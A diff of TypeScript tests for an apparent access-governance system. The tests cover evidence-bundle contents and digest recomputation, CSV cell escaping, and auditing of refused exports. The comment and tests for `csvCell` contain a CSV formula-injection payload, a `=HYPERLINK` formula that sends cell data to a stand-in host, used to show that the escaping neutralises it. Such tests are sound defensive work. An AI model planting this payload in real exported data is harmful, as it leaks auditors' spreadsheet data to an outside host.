@@ -6,7 +6,9 @@ import {
   BUNDLE_LIMITATIONS,
   bundleDigest,
   createEvidencePack,
+  csvCell,
   exportReportCsv,
+  fetchEvidencePack,
   toCsv,
 } from './export-service.js';
 import { buildHeader, envelope } from './report-service.js';
@@ -221,4 +223,271 @@ describe('the evidence bundle', () => {
     expect(pack.byteLength).toBeGreaterThan(0);
     expect(event.targetId).toBe(id);
   });
+});
+
+/**
+ * A campaign with something actually in it: two items (one certified, one
+ * terminally undecided), one reviewer, one decision, and one revocation
+ * dispatch. The bundle's whole job is to carry these, and every one of them
+ * used to be dropped.
+ */
+async function seedDecidedCampaign(): Promise<{ campaignId: string }> {
+  return withTenant(tenantId, async (tx) => {
+    const owner = await tx.person.create({
+      data: { tenantId, givenName: 'Ola', familyName: 'Berg' },
+    });
+    const reviewer = await tx.person.create({
+      data: { tenantId, givenName: 'Jan', familyName: 'Kowal' },
+    });
+    const reviewerUser = await tx.user.create({
+      data: {
+        tenantId,
+        login: 'jan.kowal',
+        email: 'jan@example.test',
+        displayName: 'Jan Kowal',
+        personId: reviewer.id,
+      },
+    });
+    const campaign = await tx.campaign.create({
+      data: {
+        tenantId,
+        name: 'Q2 finance review',
+        scope: {},
+        snapshotId,
+        reviewerSelector: 'manager',
+        fallbackSelector: 'campaign_owner',
+        ownerPersonId: owner.id,
+        opensAt: NOW,
+        dueAt: new Date(NOW.getTime() + 30 * 86_400_000),
+        originalDueAt: new Date(NOW.getTime() + 30 * 86_400_000),
+        status: 'closed_incomplete',
+      },
+    });
+
+    const mk = async (resourceId: string, status: string) =>
+      tx.campaignItem.create({
+        data: {
+          tenantId,
+          campaignId: campaign.id,
+          holdingSnapshotId: snapshotId,
+          subjectKey: `person:${owner.id}`,
+          personId: owner.id,
+          systemId: 'sys-1',
+          resourceKind: 'targetEntitlement',
+          resourceId,
+          resourceName: `Entitlement ${resourceId}`,
+          observedAt: NOW,
+          coverageStatus: 'complete',
+          status,
+        },
+      });
+    const certified = await mk('ent-1', 'certified');
+    await mk('ent-2', 'undecided');
+
+    await tx.campaignItemReviewer.create({
+      data: {
+        tenantId,
+        itemId: certified.id,
+        personId: reviewer.id,
+        via: 'selector',
+        assignedAt: NOW,
+        openedAt: NOW,
+      },
+    });
+    await tx.campaignDecision.create({
+      data: {
+        tenantId,
+        itemId: certified.id,
+        personId: reviewer.id,
+        decidedByUserId: reviewerUser.id,
+        decision: 'certify',
+        comment: null,
+        itemOpenedAt: NOW,
+        neverOpened: false,
+        decidedAt: NOW,
+        sessionDecisionOrdinal: 1,
+        coverageAtDecision: {},
+      },
+    });
+
+    const batch = await tx.revocationBatch.create({
+      data: { tenantId, campaignId: campaign.id, status: 'previewed' },
+    });
+    await tx.revocationDispatch.create({
+      data: {
+        tenantId,
+        batchId: batch.id,
+        itemId: certified.id,
+        holdingDescriptor: {},
+        route: 'provision',
+        status: 'proposed',
+        sequence: 1,
+      },
+    });
+
+    return { campaignId: campaign.id };
+  });
+}
+
+describe('the evidence bundle carries the campaign it names', () => {
+  /**
+   * THE BUNDLE WAS STRUCTURALLY EMPTY, and it verified perfectly.
+   *
+   * `createEvidencePack` took a `campaignId`, stored it on the row, and never
+   * read it: items, decisions, reviewers, notifications and dispatches were
+   * hard-coded `[]`. The digest was computed over the empty document, so it
+   * checked out -- while the printed cover asserted "an item marked
+   * `undecided` in this bundle was NOT attested", a statement about items the
+   * bundle does not contain.
+   *
+   * That is §1's harm in its most direct form: a report that looks complete, is
+   * not, and is signed anyway.
+   */
+  it('contains the campaign’s items, decisions, reviewers and dispatches', async () => {
+    const seeded = await seedDecidedCampaign();
+
+    const { bundle } = await createEvidencePack(tenantId, actorUserId, {
+      kind: 'campaign',
+      snapshotId,
+      campaignId: seeded.campaignId,
+      scope: { campaignId: seeded.campaignId },
+    });
+
+    expect(bundle.campaignId).toBe(seeded.campaignId);
+    expect(bundle.items).toHaveLength(2);
+    expect(bundle.decisions).toHaveLength(1);
+    expect(bundle.reviewers).toHaveLength(1);
+    expect(bundle.dispatches).toHaveLength(1);
+
+    // The item the cover makes a statement about is IN it, with the status the
+    // statement is about.
+    expect(bundle.items.some((i) => i.status === 'undecided')).toBe(true);
+    // And the decision carries the quality signals §17 puts in the bundle "for
+    // exactly this reason": they are the closest thing to evidence of
+    // engagement the system can honestly produce.
+    expect(bundle.decisions[0]).toMatchObject({ decision: 'certify', neverOpened: false });
+  });
+
+  it('names a campaign bundle’s own campaign, and a report bundle’s absence of one', async () => {
+    const { bundle } = await createEvidencePack(tenantId, actorUserId, {
+      kind: 'report',
+      snapshotId,
+      scope: { systemId: 'sys-1' },
+    });
+    expect(bundle.campaignId).toBeNull();
+    expect(bundle.items).toEqual([]);
+    // NOT silently empty. A report bundle legitimately has no campaign, and the
+    // cover has to distinguish that from a campaign bundle that lost its
+    // contents -- which is the state every bundle used to be in.
+    expect(bundle.limitations.join(' ')).toMatch(/no campaign/i);
+  });
+
+  /**
+   * §17: the digest exists so "a reader can recompute it a year later". It
+   * could not: nothing recorded where the bytes were, `storageRef` was never
+   * written, and re-creating the pack produced a different document because the
+   * chain head had moved.
+   */
+  it('can be fetched again and recomputes to the same digest', async () => {
+    const seeded = await seedDecidedCampaign();
+    const created = await createEvidencePack(tenantId, actorUserId, {
+      kind: 'campaign',
+      snapshotId,
+      campaignId: seeded.campaignId,
+      scope: { campaignId: seeded.campaignId },
+    });
+
+    const row = await withTenant(tenantId, (tx) =>
+      tx.evidencePack.findUniqueOrThrow({ where: { id: created.id } }),
+    );
+    expect(row.storageRef).toBe(`/api/admin/govern/evidence/${created.id}`);
+
+    // More audit events happen. The bundle must not change: it is built from
+    // the range the PACK recorded, not from the chain as it stands today.
+    await withTenant(tenantId, (tx) =>
+      recordEvent(tx, {
+        actorUserId,
+        action: 'govern.report.export',
+        targetType: 'AccessSnapshot',
+        targetId: snapshotId,
+        outcome: 'success',
+        sourceIp: null,
+        payload: {},
+      }),
+    );
+
+    const fetched = await fetchEvidencePack(tenantId, created.id);
+    expect(fetched.digestMatches).toBe(true);
+    expect(fetched.bundle.digest).toBe(created.digest);
+  });
+});
+
+/**
+ * EVERY VALUE IN THIS EXPORT ORIGINATES IN DIRECTORY OR TARGET DATA.
+ *
+ * That is what makes this a real attack rather than a lint rule: the person who
+ * names an Active Directory group is a TARGET administrator, not a Syntra one,
+ * and Govern's entire job is to inventory systems Syntra does not control. A
+ * group named `=HYPERLINK("http://x/?"&A2,"click")` executes the moment an
+ * auditor opens the export, and the cell beside it is somebody's access.
+ *
+ * Quoting does not help: a spreadsheet strips the quotes before deciding
+ * whether the value is a formula. The value has to stop being one.
+ */
+describe('csvCell', () => {
+  it('neutralises every leading character a spreadsheet treats as a formula', () => {
+    for (const dangerous of ['=', '+', '-', '@', '\t', '\r']) {
+      const cell = csvCell(`${dangerous}HYPERLINK("http://x/?"&A2,"click")`);
+      // Prefixed, so the first character is no longer the formula introducer,
+      // and quoted so the prefix survives the parse.
+      expect(cell.startsWith(`"'${dangerous}`)).toBe(true);
+    }
+  });
+
+  it('leaves an ordinary value exactly as it was', () => {
+    // The export is read by people. Quoting or prefixing every cell would make
+    // the common case unreadable to defend against the rare one.
+    expect(csvCell('Ward Nurses')).toBe('Ward Nurses');
+    expect(csvCell('')).toBe('');
+    // A minus inside a value is not a leading minus.
+    expect(csvCell('Finance-Payments')).toBe('Finance-Payments');
+  });
+
+  it('still quotes and doubles the characters CSV itself needs escaped', () => {
+    expect(csvCell('Novak, Anna "A"')).toBe('"Novak, Anna ""A"""');
+  });
+
+  it('quotes a CARRIAGE RETURN, which used to split the row', () => {
+    // The regex tested `\n` and not `\r`, so a lone CR ended the record and
+    // every field after it landed under the wrong header -- silently, in a
+    // document whose whole purpose is that somebody can read it a year later.
+    expect(csvCell('Ward\rNurses')).toBe('"Ward\rNurses"');
+  });
+});
+
+it('audits a REFUSED export as well as a successful one', async () => {
+  // §10: "the audit log should be able to answer who took a copy of it." A
+  // refusal is part of that answer. Repeated refused attempts are what an
+  // attempt to walk out with everybody's access looks like when it does not
+  // work the first time, and they left no trace at all.
+  const live = envelope(
+    {
+      live: true as const,
+      computedAt: NOW.toISOString(),
+      exportable: false as const,
+      caveat: 'live',
+    },
+    { rows: [], holderCount: { known: true, value: 0 } },
+  );
+
+  await expect(
+    exportReportCsv(tenantId, actorUserId, live, { systemId: 'sys-1' }),
+  ).rejects.toThrow(/no as-of time/);
+
+  const event = await withTenant(tenantId, (tx) =>
+    tx.auditEvent.findFirstOrThrow({ where: { action: 'govern.report.export' } }),
+  );
+  expect(event.outcome).toBe('failure');
+  expect(event.actorUserId).toBe(actorUserId);
+  expect(event.payload).toMatchObject({ format: 'csv', scope: { systemId: 'sys-1' } });
 });
